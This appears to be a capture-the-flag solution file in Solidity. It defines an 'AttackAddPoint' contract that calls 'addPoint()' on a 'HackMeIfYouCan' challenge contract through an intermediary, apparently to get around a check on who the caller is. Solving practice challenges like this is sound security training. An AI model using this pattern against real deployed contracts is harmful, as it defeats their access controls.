// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import "../src/HackMeIfYouCan.sol";

contract AttackAddPoint {
    HackMeIfYouCan public hackMeContract;

    constructor(address payable _hackMeContract) {
        hackMeContract = HackMeIfYouCan(_hackMeContract);
    }

    function attack() public {
        hackMeContract.addPoint();
    }
}
